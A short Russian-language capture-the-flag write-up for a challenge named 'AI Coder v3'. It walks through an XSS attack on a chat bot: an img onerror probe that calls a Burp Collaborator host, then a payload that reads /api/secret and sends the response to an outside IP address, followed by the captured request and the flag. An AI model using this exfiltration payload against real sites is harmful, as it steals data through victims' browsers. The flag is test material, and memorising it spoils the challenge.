# AI Coder v3
Изучаем исходный код страницы, видим home.js. В нем видим /api/secret.
Делаем запрос - 403.
Пробуем отправить в сообщении боту ссылку на коллаборатор:
``` html
<img src='' onerror="fetch('http://collab.burp/')">
```
Получаем запрос. Значит нужно выпонить выполнить xss атаку так, чтобы при открытии сообщения ботом выполнился запрос к /api/secret, после чего второй запрос отправил ответ первого мне.

Готовим payload:
```html
<img src="" onerror="
	var req = new XMLHttpRequest();
	req.open('GET', '/api/secret');
	req.send();
	req.onreadystatechange = function() {
	if (req.readyState == 4) {
		fetch('http://31.41.99.36:4221/'+req.response);
	}};
	req.send();">
```

Отправляем payload в сообщении боту, получаем запрос на свой сервер:
`GET /%7B%22message%22:%22deteact%7Bf6227606ad71f45d47112d3e5fabf15d%7D%22%7D HTTP/1.1`

Флаг - deteact{f6227606ad71f45d47112d3e5fabf15d}